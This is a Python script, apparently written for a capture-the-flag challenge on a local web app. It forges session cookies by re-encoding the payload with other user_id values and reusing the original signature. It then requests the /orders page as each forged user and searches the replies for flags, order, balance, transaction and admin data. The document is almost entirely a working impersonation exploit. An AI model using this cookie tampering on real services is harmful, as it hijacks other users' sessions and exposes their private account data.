import requests
import base64
import json
import re

# Cookie components (no signature validation)
cookie_template = "eyJ1c2VyX2lkIjoxMDAzMn0.aVfKCw.jl3AMMmNnBqRtf0OTxwr0Uo3aeg"
parts = cookie_template.split('.')
_, timestamp, signature = parts

print("[*] Examining actual response content for different user IDs\n")

# Let's check a few representative user IDs and see the actual content
test_ids = [1, 2, 3, 10, 100, 1000, 9999, 10000, 10032]

for user_id in test_ids:
    test_payload = {"user_id": user_id}
    payload_str = json.dumps(test_payload, separators=(',', ':'))
    payload_b64 = base64.urlsafe_b64encode(payload_str.encode()).decode().rstrip('=')
    tampered_cookie = f"{payload_b64}.{timestamp}.{signature}"
    headers = {'Cookie': f'session={tampered_cookie}'}
    
    print(f"="*70)
    print(f"Testing user_id={user_id}")
    print(f"="*70)
    
    # Test /orders endpoint (largest and most likely to contain data)
    url = "http://127.0.0.1:33198/orders"
    response = requests.get(url, headers=headers, timeout=5)
    
    print(f"Response length: {len(response.text)}B")
    print(f"Status: {response.status_code}")
    
    # Check for flags
    flag_matches = re.findall(r'FLAG\{[^}]+\}', response.text)
    if flag_matches:
        print(f"[!] FLAGS FOUND: {flag_matches}")
    
    # Print beginning of response to see what's there
    print(f"Response snippet (first 500 chars):")
    print(response.text[:500])
    print("\n")
    
    # Also look for any interesting patterns
    interesting_patterns = [
        (r'Welcome[^<]{0,100}', "Welcome message"),
        (r'Order[^<]{0,100}', "Order data"),
        (r'User[^<]{0,100}', "User info"),
        (r'Balance[^<]{0,100}', "Balance info"),
        (r'Transaction[^<]{0,100}', "Transaction data"),
        (r'Admin[^<]{0,100}', "Admin content"),
        (r'E\d{3}[^<]{0,50}', "Error messages")
    ]
    
    for pattern, desc in interesting_patterns:
        matches = re.findall(pattern, response.text, re.IGNORECASE)
        if matches:
            print(f"  {desc}: {matches[:3]}")  # Show first 3 matches
    
    print("\n")
